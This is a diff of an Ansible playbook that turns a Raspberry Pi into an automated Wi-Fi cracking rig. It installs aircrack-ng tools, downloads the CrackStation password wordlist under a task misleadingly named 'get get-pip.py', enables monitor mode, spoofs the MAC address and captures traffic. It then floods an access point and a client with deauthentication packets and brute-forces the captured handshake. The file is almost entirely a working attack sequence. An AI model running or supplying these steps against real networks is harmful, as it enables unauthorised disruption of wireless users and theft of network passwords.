@@ -1,54 +1,60 @@
 ---
 - name: "install apt-get packages"
-  apt: 
+  apt:
     name: [ "aircrack-ng", "macchanger", "iw" ]
     state: present
     update_cache: yes
     cache_valid_time: 3600
 
+- name: get get-pip.py
+  get_url:
+    url: https://crackstation.net/files/crackstation.txt.gz
+    dest: /tmp/crackstation.txt.gz
+
 - name: "Extract crackstation.txt.gz into /home/pi"
   unarchive:
-    src: https://crackstation.net/files/crackstation.txt.gz
+    src: /tmp/crackstation.txt.gz
     dest: "/home/pi"
+    remote_src: yes
 
 - name: "aircrack-ng"
-  shell: 
+  shell:
     cmd: "aircrack-ng"
   register: result
 
-- name: "debug"  
+- name: "debug"
   debug:
     msg: "{{ result.stdout_lines }}"
 
 - name: "aircrack-ng"
-  shell: 
+  shell:
     cmd: "airmon-ng start wlan1"
 
 - name: "macchanger -p wlan1mon"
-  shell: 
+  shell:
     cmd: "macchanger -p wlan1mon"
 
 - name: "ifconfig wlan1mon up"
-  shell: 
+  shell:
     cmd: "ifconfig wlan1mon up"
 
 - name: "airodump-ng wlan1mon"
-  shell: 
+  shell:
     cmd: "airodump-ng wlan1mon"
   register: result
 
 - name: "aireplay-ng -0 50 -e PiFi -a B8:27:EB:XX:XX:XX -c 00:1d:d9:XX:XX:XX wlan1mon new connection"
   shell:
       cmd: "aireplay-ng -0 50 -e PiFi -a B8:27:EB:XX:XX:XX -c 00:1d:d9:XX:XX:XX wlan1mon"
-- name: "debug"  
+- name: "debug"
   debug:
     msg: "{{ result.stdout_lines }}"
 
 - name: "airodump-ng wlan1mon"
-  shell: 
+  shell:
     cmd: "airodump-ng-oui-update"
 
 - name: "aircrack-ng data-01.cap -w /home/pi/crackstation.txt"
-  shell: 
+  shell:
     cmd: "aircrack-ng data-01.cap -w /home/pi/crackstation.txt"
 
